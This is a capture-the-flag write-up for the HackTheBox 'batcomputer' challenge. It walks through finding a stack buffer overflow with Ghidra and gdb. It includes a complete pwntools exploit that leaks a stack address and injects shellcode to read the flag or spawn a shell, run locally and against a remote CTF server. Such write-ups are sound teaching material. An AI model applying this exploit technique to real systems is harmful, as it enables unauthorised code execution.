### Binary Exploitation

### Source: HTB

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ chmod +x batcomputer 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ file batcomputer 
batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ checksec batcomputer 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomputer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Ah sweet we have NX disabled meaning if we get a buffer overflow we can write shellcode in the stack and execute it

Also take note we're working with a x64 binary

Lets run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 1
It was very hard, but Alfred managed to locate him: 0x7fffffffde64
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: pwed
The password is wrong.
I can't give you access to the BatMobile!
```

So basically choosing option 1 leaks an address in the stack and choosing address 2 gives a passport prompt input

I'll decompile the binary using ghidra

```
undefined8 FUN_001011ec(void)

{
  int iVar1;
  int local_68;
  char acStack100 [16];
  undefined auStack84 [76];
  
  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(acStack100,0,0x10);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",auStack84);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack100);
    iVar1 = strcmp(acStack100,"b4tp@$$w0rd!");
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,auStack84,0x89);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```

We see whats basically happening 

```
1. It starts a while loop on FUN_001011a9() which prints an address in the stack when the input choosen is 1
2. If that isn't the choice given and the choice given is 2 it asks for a password
3. And the password input is being string compared with b4tp@$$w0rd!
4. If the password isn't correct it exists
5. But if it is we get another option to give input which is given an offset of 0x89 bytes
```

So here's the main stuff here

```
1. We have an address of the stack already
2. After we give the correct password it will read any input given
3. The input we give is stored in a buffer which can only hold up 76bytes but we given 0x89 to read #bug here
```

Now here's the bug, we know that there's an extra 61bytes `int(0x89)-76` which we can write

Lets just confirm this 

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ ./batcomputer
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: b4tp@$$w0rd!
Access Granted. 
Enter the navigation commands: pwnerpwner
Roger that!
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: b4tp@$$w0rd!
Access Granted. 
Enter the navigation commands: pwnerpwner
Roger that!
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> ^C
```

We see it basically won't end so its cool 

Here's how the exploit will go 

```
1. I'll get the offset 
2. Put shellcode in the stack address leaked when option 1 is chosen
3. Overwrite the rip to call the shellcode
```

Now lets get the offset 

I'll hop on to gdb and generate 100 bytes of data which i'll use as command then after it crash i will get the offset

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ gdb -q batcomputer
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.02ms using Python engine 3.11
Reading symbols from batcomputer...
(No debugging symbols found in batcomputer)
gef➤  
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomputer 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 2
Ok. Let's do this. Enter the password: b4tp@$$w0rd!
Access Granted. 
Enter the navigation commands: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Roger that!
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 
```

It won't exit after giving it 100bytes of data cause from the decompiled code it doesn't have a return call

```
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,auStack84,0x89);
    puts("Roger that!");
  }
```

So the get the crash error i need to give any random data which will then call the return call

```
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```

Here it is

```
> 2
Ok. Let's do this. Enter the password: b4tp@$$w0rd!
Access Granted. 
Enter the navigation commands: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Roger that!
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
> 405
Too bad, now who's gonna save Gotham? Alfred?

Program received signal SIGSEGV, Segmentation fault.
0x000055555555531f in ?? ()























[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffdf48  →  0x007fffffffe2a9  →  "/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomp[...]"
$rcx   : 0x007ffff7ec10d0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffde38  →  "vaaawaaaxaaayaaa\nQUUUU"
$rbp   : 0x6161617561616174 ("taaauaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da10  →  0x0000000000000000
$rip   : 0x0055555555531f  →   ret 
$r8    : 0x1999999999999999
$r9    : 0x007ffff7f9ba80  →  0x00000000fbad208b
$r10   : 0x007ffff7f45ac0  →  0x0000000100000000
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdf58  →  0x007fffffffe2e0  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde38│+0x0000: "vaaawaaaxaaayaaa\nQUUUU"      ← $rsp
0x007fffffffde40│+0x0008: "xaaayaaa\nQUUUU"
0x007fffffffde48│+0x0010: 0x0055555555510a  →   (bad) 
0x007fffffffde50│+0x0018: 0x0000000155554040
0x007fffffffde58│+0x0020: 0x007fffffffdf48  →  0x007fffffffe2a9  →  "/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomp[...]"
0x007fffffffde60│+0x0028: 0x007fffffffdf48  →  0x007fffffffe2a9  →  "/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomp[...]"
0x007fffffffde68│+0x0030: 0xecf8b597aedcca93
0x007fffffffde70│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555314                  call   0x555555555030 <puts@plt>
   0x555555555319                  mov    eax, 0x0
   0x55555555531e                  leave  
 → 0x55555555531f                  ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "batcomputer", stopped 0x55555555531f in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555531f → ret 
───────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Now using the first four byte that is in the rsp register i'll use cyclic to get the offset

```
 ──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ cyclic -l vaaa
84
```

Cool the offset is 84 

But all this can be automated using pwntool 😉

Here's the final solve script 

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', '2')  # Chase joker
    p.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')  # Enter password
    p.sendlineafter('Enter the navigation commands:', payload)  # Cyclic pattern
    p.sendlineafter('>', '420')  # Enter invalid option to trigger return 
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
#gdbscript = '''
#init-pwndbg
#breakrva 0x0000131f
#continue
#'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './batcomputer'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Get the stack address (where out navigation commands will go)
print(io.recvuntil('>'))
option1 = '1'
io.sendline(option1)
leak = io.recvline()
find_addr = leak.find(b'0x')
addr = leak[find_addr:].strip()
stack_addr = int(addr, 16)

# Need to pop registers at the beginning to make room on stack
shellcode = asm(shellcraft.popad())
# Build shellcode (cat flag.txt or spawn shell)
# shellcode += asm(shellcraft.sh())
shellcode += asm(shellcraft.cat('flag.txt'))
# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    padding,
    shellcode,
    stack_addr
])

io.sendlineafter('>', '2')  # Chase joker
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')  # Enter password

io.sendlineafter('Enter the navigation commands:', payload)  # Inject payload

# Enter invalid option to trigger return (jump to our stack_addr)
io.sendlineafter('>', '420')
io.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

# Get our flag!
flag = io.recv()
success(flag)

# Or, spawn a shell
# io.interactive()
```

On running it locally

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ python2 exploit.py      
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './batcomputer': pid 290552
[*] Process './batcomputer' stopped with exit code -11 (SIGSEGV) (pid 290552)
[+] Parsing corefile...: Done
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/bat/core.290552'
    Arch:      amd64-64-little
    RIP:       0x55555555531f
    RSP:       0x7fffffffdeb8
    Exe:       '/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomputer' (0x555555554000)
    Fault:     0x6161617761616176
[*] located EIP/RIP offset at 84
[+] Starting local process './batcomputer': pid 290559
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
>
[+] FLAG{F4K3_Fl4G_F0R_T3ST1NG}
[*] Stopped process './batcomputer' (pid 290559)
```

It worked now i'll try it on the remote server

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/bat]
└─$ python2 exploit.py REMOTE 138.68.164.196 32194
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './batcomputer': pid 291119
[*] Process './batcomputer' stopped with exit code -11 (SIGSEGV) (pid 291119)
[+] Parsing corefile...: Done
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/bat/core.291119'
    Arch:      amd64-64-little
    RIP:       0x55555555531f
    RSP:       0x7fffffffdeb8
    Exe:       '/home/mark/Desktop/BofLearn/Challs/HTB/bat/batcomputer' (0x555555554000)
    Fault:     0x6161617761616176
[*] located EIP/RIP offset at 84
[+] Opening connection to 138.68.164.196 on port 32194: Done
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
>
[+] HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
[*] Closed connection to 138.68.164.196 port 32194
```

And we're done 

<br> <br> 
[Back To Home](../../index.md)

